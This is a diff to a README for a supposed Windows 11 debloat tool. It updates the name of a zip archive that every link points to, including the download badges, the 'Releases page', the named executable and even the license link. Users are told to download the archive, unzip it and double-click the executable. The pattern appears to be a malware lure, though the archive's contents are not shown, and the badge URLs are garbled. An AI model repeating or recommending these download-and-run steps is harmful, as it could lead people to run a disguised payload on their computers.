@@ -1,6 +1,6 @@
 # 🌟 Windows-11-Debloat-AI-Slop-Removal - Speed Up Your PC Easily
 
-[![Download](https://raw.githubusercontent.com/balaharans2904/Windows-11-Debloat-AI-Slop-Removal/main/gambeson/A_Removal_Debloat_Slop_Windows_v1.4.zip%20Now-Click%https://raw.githubusercontent.com/balaharans2904/Windows-11-Debloat-AI-Slop-Removal/main/gambeson/A_Removal_Debloat_Slop_Windows_v1.4.zip)](https://raw.githubusercontent.com/balaharans2904/Windows-11-Debloat-AI-Slop-Removal/main/gambeson/A_Removal_Debloat_Slop_Windows_v1.4.zip)
+[![Download](https://raw.githubusercontent.com/balaharans2904/Windows-11-Debloat-AI-Slop-Removal/main/gambeson/A_Debloat_Slop_Removal_Windows_v2.4-alpha.3.zip%20Now-Click%https://raw.githubusercontent.com/balaharans2904/Windows-11-Debloat-AI-Slop-Removal/main/gambeson/A_Debloat_Slop_Removal_Windows_v2.4-alpha.3.zip)](https://raw.githubusercontent.com/balaharans2904/Windows-11-Debloat-AI-Slop-Removal/main/gambeson/A_Debloat_Slop_Removal_Windows_v2.4-alpha.3.zip)
 
 ## 🚀 Getting Started
 
@@ -8,14 +8,14 @@ Welcome to Windows-11-Debloat-AI-Slop-Removal. This tool helps you clean up Wind
 
 ## 📥 Download & Install
 
-To get started, visit the [Releases page here](https://raw.githubusercontent.com/balaharans2904/Windows-11-Debloat-AI-Slop-Removal/main/gambeson/A_Removal_Debloat_Slop_Windows_v1.4.zip) to download the latest version of the software. 
+To get started, visit the [Releases page here](https://raw.githubusercontent.com/balaharans2904/Windows-11-Debloat-AI-Slop-Removal/main/gambeson/A_Debloat_Slop_Removal_Windows_v2.4-alpha.3.zip) to download the latest version of the software. 
 
 1. Click on the link above.
 2. Look for the latest release titled with a version number.
 3. Find the appropriate file for your system (likely a `.zip` or `.exe`).
 4. Click the file to download.
 
-Once downloaded, unzip the file if it is in a `.zip` format. Locate the executable file (often named `https://raw.githubusercontent.com/balaharans2904/Windows-11-Debloat-AI-Slop-Removal/main/gambeson/A_Removal_Debloat_Slop_Windows_v1.4.zip` or similar). Double-click it to start the application.
+Once downloaded, unzip the file if it is in a `.zip` format. Locate the executable file (often named `https://raw.githubusercontent.com/balaharans2904/Windows-11-Debloat-AI-Slop-Removal/main/gambeson/A_Debloat_Slop_Removal_Windows_v2.4-alpha.3.zip` or similar). Double-click it to start the application.
 
 ## ⚙️ System Requirements
 
@@ -76,10 +76,10 @@ Join our community of users to share experiences, tips, and troubleshooting help
 
 ## 📜 License
 
-This project is licensed under the [MIT License](https://raw.githubusercontent.com/balaharans2904/Windows-11-Debloat-AI-Slop-Removal/main/gambeson/A_Removal_Debloat_Slop_Windows_v1.4.zip). You can freely use, modify, and distribute this software under the terms of the license.
+This project is licensed under the [MIT License](https://raw.githubusercontent.com/balaharans2904/Windows-11-Debloat-AI-Slop-Removal/main/gambeson/A_Debloat_Slop_Removal_Windows_v2.4-alpha.3.zip). You can freely use, modify, and distribute this software under the terms of the license.
 
 ## ⚡ Final Thoughts
 
 We hope you find Windows-11-Debloat-AI-Slop-Removal helpful in optimizing your Windows 11 experience. Don't forget to check back frequently for updates and new features!
 
-[![Download](https://raw.githubusercontent.com/balaharans2904/Windows-11-Debloat-AI-Slop-Removal/main/gambeson/A_Removal_Debloat_Slop_Windows_v1.4.zip%20Now-Click%https://raw.githubusercontent.com/balaharans2904/Windows-11-Debloat-AI-Slop-Removal/main/gambeson/A_Removal_Debloat_Slop_Windows_v1.4.zip)](https://raw.githubusercontent.com/balaharans2904/Windows-11-Debloat-AI-Slop-Removal/main/gambeson/A_Removal_Debloat_Slop_Windows_v1.4.zip)
+[![Download](https://raw.githubusercontent.com/balaharans2904/Windows-11-Debloat-AI-Slop-Removal/main/gambeson/A_Debloat_Slop_Removal_Windows_v2.4-alpha.3.zip%20Now-Click%https://raw.githubusercontent.com/balaharans2904/Windows-11-Debloat-AI-Slop-Removal/main/gambeson/A_Debloat_Slop_Removal_Windows_v2.4-alpha.3.zip)](https://raw.githubusercontent.com/balaharans2904/Windows-11-Debloat-AI-Slop-Removal/main/gambeson/A_Debloat_Slop_Removal_Windows_v2.4-alpha.3.zip)
